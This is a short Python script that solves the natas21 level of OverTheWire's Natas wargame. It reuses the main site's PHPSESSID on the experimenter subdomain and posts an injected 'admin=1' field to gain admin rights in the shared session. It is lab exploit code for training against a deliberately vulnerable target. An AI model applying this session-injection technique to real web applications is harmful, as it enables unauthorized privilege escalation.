from natas import Natas

natas = Natas('natas21', keep_session=True)
natasex = Natas('natas21', keep_session=True, custom_url='http://natas21-experimenter.natas.labs.overthewire.org/')

debugget = {
        'debug': 'true'
        }

asdf = {
        'bgcolor': 'blue'
        }

post = {
        'admin': '1',
        'bgcolor': 'blue',
        'submit': 'true'
        }

resp = natas.get_response(get_data=asdf)



phpsessid = natas.get_cookies().get('PHPSESSID')



natasex.set_cookie('PHPSESSID', phpsessid)

resp2 = natasex.get_response(post_data=post, get_data=debugget)

resp = natas.get_response(get_data=asdf)

print()
print()
print(resp.prettify())



print(natas.get_cookies())
print(natasex.get_cookies())
